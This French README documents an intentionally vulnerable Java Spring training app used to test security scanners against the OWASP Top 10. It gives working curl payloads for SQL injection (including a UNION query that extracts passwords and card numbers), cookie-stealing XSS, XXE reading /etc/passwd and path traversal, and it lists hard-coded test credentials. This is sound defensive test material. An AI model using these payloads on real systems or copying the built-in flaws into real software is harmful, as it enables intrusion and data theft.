# Application Web Vulnérable - Tests de Sécurité Applicative

## ⚠️ AVERTISSEMENT CRITIQUE ⚠️

**Cette application contient intentionnellement des vulnérabilités de sécurité graves.**

- ❌ **NE JAMAIS DÉPLOYER EN PRODUCTION**
- ❌ **NE JAMAIS EXPOSER SUR INTERNET**
- ✅ **Utiliser UNIQUEMENT dans un environnement de test isolé**
- ✅ **Conçue pour tester des outils de sécurité applicative (SAST, DAST, IAST, SCA)**

## Description

Application Java Spring MVC intentionnellement vulnérable qui implémente les 10 principales vulnérabilités du [OWASP Top 10 (2021)](https://owasp.org/Top10/).

## Vulnérabilités Implémentées

### A01:2021 - Broken Access Control
- ✅ Accès non autorisé aux profils utilisateurs
- ✅ Pas de vérification des permissions
- ✅ Exposition de données sensibles

**Endpoints:**
- `GET /user/profile/{userId}` - Voir n'importe quel profil sans autorisation

### A02:2021 - Cryptographic Failures
- ✅ Mots de passe stockés en clair
- ✅ Données sensibles non chiffrées (SSN, cartes de crédit)
- ✅ Pas de hashing des mots de passe

**Endpoints:**
- `GET /user/admin/export` - Export de toutes les données sensibles en clair

### A03:2021 - Injection
- ✅ SQL Injection via paramètres utilisateur
- ✅ SQL Injection via ORDER BY
- ✅ Command Injection
- ✅ Cross-Site Scripting (XSS)

**Endpoints:**
- `GET /user/search?username=` - SQL Injection
- `GET /user/list?sortBy=` - SQL Injection via ORDER BY
- `GET /user/comment?username=&comment=` - XSS Reflected
- `GET /file/convert?filename=` - Command Injection

**Exemples d'exploitation:**
```bash
# SQL Injection
curl "http://localhost:8080/vulnerable-app/user/search?username=' OR '1'='1"

# XSS
curl "http://localhost:8080/vulnerable-app/user/comment?username=test&comment=<script>alert('XSS')</script>"
```

### A04:2021 - Insecure Design
- ✅ XML External Entity (XXE) Injection
- ✅ Parser XML non sécurisé

**Endpoints:**
- `POST /xml/parse` - XXE Injection

**Exemple d'exploitation:**
```bash
curl -X POST http://localhost:8080/vulnerable-app/xml/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

### A05:2021 - Security Misconfiguration
- ✅ Cookies sans flags HttpOnly et Secure
- ✅ Pas de headers de sécurité (CSP, HSTS, X-Frame-Options)
- ✅ Messages d'erreur détaillés
- ✅ Configuration de session non sécurisée
- ✅ Upload de fichiers sans limite de taille

### A06:2021 - Vulnerable and Outdated Components
- ✅ Log4j 2.14.1 (CVE-2021-44228 - Log4Shell)
- ✅ Spring Framework 5.2.0 (versions vulnérables)
- ✅ Jackson 2.9.8 (CVE-2019-12384)
- ✅ Commons FileUpload 1.3.1 (CVE-2016-1000031)

### A07:2021 - Identification and Authentication Failures
- ✅ Mots de passe stockés en clair
- ✅ Pas de limite de tentatives de connexion
- ✅ Messages d'erreur informatifs révélant l'existence des utilisateurs
- ✅ JWT avec clé secrète faible hard-codée
- ✅ Réinitialisation de mot de passe sans vérification
- ✅ Session fixation

**Endpoints:**
- `POST /auth/login` - Authentification faible
- `POST /auth/register` - Inscription sans validation
- `POST /auth/reset-password` - Réinitialisation non sécurisée

**Exemples:**
```bash
# Login
curl -X POST "http://localhost:8080/vulnerable-app/auth/login?username=admin&password=admin123"

# Register
curl -X POST "http://localhost:8080/vulnerable-app/auth/register?username=newuser&password=123&email=user@test.com"
```

### A08:2021 - Software and Data Integrity Failures
- ✅ Désérialisation Java non sécurisée
- ✅ Accepte des objets sérialisés arbitraires
- ✅ Risque d'exécution de code à distance (RCE)

**Endpoints:**
- `POST /deserialize/object` - Insecure Deserialization
- `GET /deserialize/serialize-example?message=` - Helper pour créer des objets sérialisés

### A09:2021 - Security Logging and Monitoring Failures
- ✅ Logging insuffisant des événements de sécurité
- ✅ Pas de monitoring des tentatives de connexion
- ✅ Pas d'alertes de sécurité
- ✅ Logs inadéquats pour l'audit

### A10:2021 - Server-Side Request Forgery (Bonus)
Vulnérabilités additionnelles:
- ✅ Path Traversal / Directory Traversal
- ✅ Unrestricted File Upload
- ✅ Arbitrary File Read

**Endpoints:**
- `GET /file/download?filename=` - Path Traversal
- `POST /file/upload` - Upload non restreint
- `GET /file/read?path=` - Lecture de fichiers arbitraires

**Exemples:**
```bash
# Path Traversal
curl "http://localhost:8080/vulnerable-app/file/download?filename=../../etc/passwd"

# File Read
curl "http://localhost:8080/vulnerable-app/file/read?path=/etc/passwd"
```

## Prérequis

- Java 11 ou supérieur
- Maven 3.6+
- Docker et Docker Compose (pour le déploiement conteneurisé)

## Installation et Déploiement

### Option 1: Déploiement avec Docker (Recommandé)

```bash
# 1. Compiler l'application
mvn clean package

# 2. Construire et démarrer le conteneur
docker-compose up -d

# 3. L'application sera accessible sur http://localhost:8080/vulnerable-app
```

### Option 2: Déploiement manuel avec Maven

```bash
# 1. Compiler l'application
mvn clean package

# 2. Déployer le WAR sur Tomcat
cp target/vulnerable-app.war /path/to/tomcat/webapps/

# 3. Démarrer Tomcat
/path/to/tomcat/bin/catalina.sh run
```

### Option 3: Build Docker uniquement

```bash
# Compiler
mvn clean package

# Construire l'image
docker build -t vulnerable-web-app:latest .

# Exécuter le conteneur
docker run -d -p 8080:8080 --name vulnerable-app vulnerable-web-app:latest
```

## Accès à l'Application

- **URL:** http://localhost:8080/vulnerable-app
- **Documentation:** http://localhost:8080/vulnerable-app/index.html

## Comptes de Test

| Username | Password  | Rôle      |
|----------|-----------|-----------|
| admin    | admin123  | admin     |
| john     | password  | user      |
| alice    | alice2023 | user      |
| bob      | 12345     | user      |
| charlie  | qwerty    | moderator |

## Déploiement sur Plateformes Cloud

### AWS (Elastic Container Service)

```bash
# 1. Compiler et créer l'image
mvn clean package
docker build -t vulnerable-web-app:latest .

# 2. Tag pour ECR
aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin YOUR_ACCOUNT.dkr.ecr.us-east-1.amazonaws.com
docker tag vulnerable-web-app:latest YOUR_ACCOUNT.dkr.ecr.us-east-1.amazonaws.com/vulnerable-web-app:latest

# 3. Push vers ECR
docker push YOUR_ACCOUNT.dkr.ecr.us-east-1.amazonaws.com/vulnerable-web-app:latest

# 4. Créer une tâche ECS avec cette image
```

### Azure (Container Instances)

```bash
# 1. Compiler et créer l'image
mvn clean package
docker build -t vulnerable-web-app:latest .

# 2. Login vers Azure Container Registry
az acr login --name yourregistry

# 3. Tag et push
docker tag vulnerable-web-app:latest yourregistry.azurecr.io/vulnerable-web-app:latest
docker push yourregistry.azurecr.io/vulnerable-web-app:latest

# 4. Déployer sur ACI
az container create \
  --resource-group myResourceGroup \
  --name vulnerable-app \
  --image yourregistry.azurecr.io/vulnerable-web-app:latest \
  --dns-name-label vulnerable-app-test \
  --ports 8080
```

### Google Cloud (Cloud Run)

```bash
# 1. Compiler
mvn clean package

# 2. Build et push vers GCR
gcloud builds submit --tag gcr.io/YOUR_PROJECT_ID/vulnerable-web-app

# 3. Déployer sur Cloud Run
gcloud run deploy vulnerable-web-app \
  --image gcr.io/YOUR_PROJECT_ID/vulnerable-web-app \
  --platform managed \
  --region us-central1 \
  --allow-unauthenticated \
  --port 8080
```

## Tests de Sécurité

### Analyse Statique (SAST)

```bash
# SonarQube
mvn sonar:sonar -Dsonar.host.url=http://localhost:9000

# SpotBugs
mvn spotbugs:spotbugs

# OWASP Dependency-Check
mvn dependency-check:check
```

### Analyse Dynamique (DAST)

```bash
# OWASP ZAP
zap-cli quick-scan http://localhost:8080/vulnerable-app

# Nikto
nikto -h http://localhost:8080/vulnerable-app
```

### Software Composition Analysis (SCA)

```bash
# OWASP Dependency-Check
mvn org.owasp:dependency-check-maven:check

# Snyk
snyk test
```

## Structure du Projet

```
.
├── src/
│   ├── main/
│   │   ├── java/com/vulnerable/app/
│   │   │   ├── config/          # Configuration Spring
│   │   │   ├── controller/      # Contrôleurs avec vulnérabilités
│   │   │   ├── model/           # Modèles de données
│   │   │   └── service/         # Services métier
│   │   ├── resources/
│   │   │   ├── schema.sql       # Schéma de base de données
│   │   │   └── data.sql         # Données de test
│   │   └── webapp/
│   │       ├── WEB-INF/
│   │       │   └── web.xml      # Configuration web
│   │       └── index.html       # Page d'accueil
├── Dockerfile                    # Image Docker
├── docker-compose.yml           # Orchestration Docker
├── pom.xml                      # Configuration Maven
└── README.md                    # Ce fichier
```

## Outils de Test Recommandés

### SAST (Static Application Security Testing)
- SonarQube
- Checkmarx
- Fortify
- Semgrep
- SpotBugs

### DAST (Dynamic Application Security Testing)
- OWASP ZAP
- Burp Suite
- Acunetix
- Nikto
- sqlmap

### IAST (Interactive Application Security Testing)
- Contrast Security
- Seeker
- Hdiv Detection

### SCA (Software Composition Analysis)
- OWASP Dependency-Check
- Snyk
- WhiteSource
- Black Duck

## Exemples de Tests

### Test SQL Injection

```bash
# Test basique
curl "http://localhost:8080/vulnerable-app/user/search?username=' OR '1'='1"

# Extraction de données
curl "http://localhost:8080/vulnerable-app/user/search?username=' UNION SELECT id,username,password,email,role,ssn,credit_card FROM users--"
```

### Test XSS

```bash
curl "http://localhost:8080/vulnerable-app/user/comment?username=test&comment=<script>alert(document.cookie)</script>"
```

### Test XXE

```bash
curl -X POST http://localhost:8080/vulnerable-app/xml/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

### Test Path Traversal

```bash
curl "http://localhost:8080/vulnerable-app/file/download?filename=../../../../etc/passwd"
```

## Nettoyage

```bash
# Arrêter et supprimer les conteneurs
docker-compose down

# Supprimer les volumes
docker-compose down -v

# Supprimer l'image
docker rmi vulnerable-web-app:latest
```

## Ressources

- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [CWE Top 25](https://cwe.mitre.org/top25/)

## Licence

Cette application est fournie "en l'état" à des fins éducatives et de test uniquement. L'auteur décline toute responsabilité pour toute utilisation inappropriée.

## Support

Pour toute question ou problème, veuillez créer une issue dans le dépôt du projet.

---

**Rappel:** Cette application est dangereuse par conception. Ne l'utilisez que dans un environnement isolé et contrôlé.
